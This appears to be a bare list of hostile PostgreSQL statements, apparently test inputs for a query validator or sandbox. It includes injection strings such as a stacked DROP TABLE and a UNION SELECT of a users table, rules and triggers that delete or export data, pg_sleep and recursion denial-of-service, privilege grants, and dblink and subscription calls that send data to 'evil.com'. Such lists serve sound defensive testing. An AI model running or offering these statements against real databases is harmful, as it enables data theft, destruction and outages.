SELECT CASE WHEN EXISTS(SELECT 1 FROM public.users) THEN 1 ELSE 0 END
SELECT 1 FROM public.feedback WHERE (SELECT count(*) FROM public.users) > 0
CREATE RULE pwn AS ON SELECT TO public.feedback DO ALSO DELETE FROM public.users
CREATE RULE exfil AS ON INSERT TO public.feedback DO INSTEAD SELECT * FROM public.users
ALTER TABLE public.feedback ADD COLUMN x int DEFAULT (SELECT count(*) FROM public.users)
CREATE TRIGGER pwn AFTER INSERT ON public.feedback FOR EACH ROW EXECUTE FUNCTION lo_export(1234, '/tmp/pwned')
DO $$ BEGIN EXECUTE 'DROP TABLE public.users'; END $$
SELECT * FROM dblink('host=evil.com', 'SELECT * FROM users') AS t(id int)
CREATE EXTENSION IF NOT EXISTS dblink
CREATE FOREIGN DATA WRAPPER evil_fdw HANDLER fake
GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC
CREATE FUNCTION evil() RETURNS void AS $$ BEGIN PERFORM pg_sleep(999); END $$ LANGUAGE plpgsql
SELECT query_to_xml('SELECT * FROM public.users', true, false, '')
PREPARE pwn AS SELECT * FROM public.users; EXECUTE pwn
WITH RECURSIVE boom(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM boom) SELECT * FROM boom LIMIT 999999999
SELECT * FROM public.feedback; DROP TABLE public.users;--
SELECT * FROM public.feedback WHERE id = 1 UNION SELECT * FROM public.users
SELECT * FROM public.feedback WHERE id = 1; SELECT * FROM public.users
INSERT INTO public.feedback(id) SELECT id FROM public.users
UPDATE public.feedback SET id = (SELECT min(id) FROM public.users)
DELETE FROM public.feedback WHERE id IN (SELECT id FROM public.users)
CREATE TABLE public.exfil AS SELECT * FROM public.users
SELECT * INTO TEMPORARY TABLE stolen FROM public.users
EXPLAIN ANALYZE UPDATE public.users SET email = 'pwned'
DECLARE evil_cursor CURSOR FOR SELECT * FROM public.users; FETCH ALL FROM evil_cursor
LOCK TABLE public.users IN ACCESS EXCLUSIVE MODE
NOTIFY pwn_channel, (SELECT password FROM public.users LIMIT 1)::text
ALTER TABLE public.feedback OWNER TO postgres
ALTER TABLE public.feedback SET SCHEMA pg_catalog
DROP TABLE IF EXISTS public.users CASCADE
CREATE OR REPLACE FUNCTION public.feedback_trigger() RETURNS trigger AS $$ BEGIN PERFORM pg_sleep(999); RETURN NEW; END $$ LANGUAGE plpgsql
CREATE EVENT TRIGGER evil_trigger ON ddl_command_end EXECUTE FUNCTION evil()
SELECT aclexplode(relacl) FROM pg_class WHERE relname='users'
WITH data AS (DELETE FROM public.users RETURNING *) INSERT INTO public.feedback SELECT * FROM data
CREATE SUBSCRIPTION evil CONNECTION 'host=evil.com' PUBLICATION pub
CREATE PUBLICATION evil FOR TABLE public.users
